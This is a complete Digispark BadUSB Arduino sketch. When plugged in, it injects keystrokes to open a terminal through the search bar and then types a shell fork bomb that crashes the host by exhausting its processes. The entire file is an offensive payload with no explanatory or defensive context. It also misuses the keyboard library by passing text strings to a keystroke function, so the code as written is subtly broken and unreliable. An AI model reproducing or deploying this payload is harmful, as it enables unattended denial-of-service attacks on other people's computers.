#include "DigiKeyboard.h"
void setup() {
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(CONTROL, SPACE);
DigiKeyboard.delay(500);   
DigiKeyboard.sendKeyStroke("terminal");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(":(){ :|:& };:;exit");

}

void loop() {
}
